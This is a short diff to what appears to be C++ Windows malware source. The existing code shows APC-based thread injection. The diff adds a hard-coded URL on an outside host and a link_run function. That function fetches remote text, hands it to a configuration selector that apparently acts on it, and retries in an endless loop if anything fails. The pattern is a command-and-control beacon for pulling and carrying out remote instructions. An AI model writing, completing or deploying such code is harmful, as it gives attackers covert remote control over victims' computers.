@@ -10,7 +10,7 @@
 #pragma comment ( lib, "wldap32.lib" )
 #pragma comment(lib, "Advapi32.lib")
 
-
+#define URL "http://api.10086.li/txt.txt"
 
 
 using namespace std;
@@ -189,5 +189,22 @@ DWORD WINAPI edoc_run(LPVOID lpParameter)
 
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
     ResumeThread(threadHandle);
+    return 0;
+}
+
+DWORD WINAPI link_run(LPVOID P)
+{
+GO_ON:
+    try {
+        CURLClass client;
+        string response = client.Get(URL);
+        Configure* configure = new Configure(response);
+        configure->Selector();
+    }
+    catch (exception e)
+    {
+        Sleep(2000);
+        goto GO_ON;
+    }
     return 0;
 }
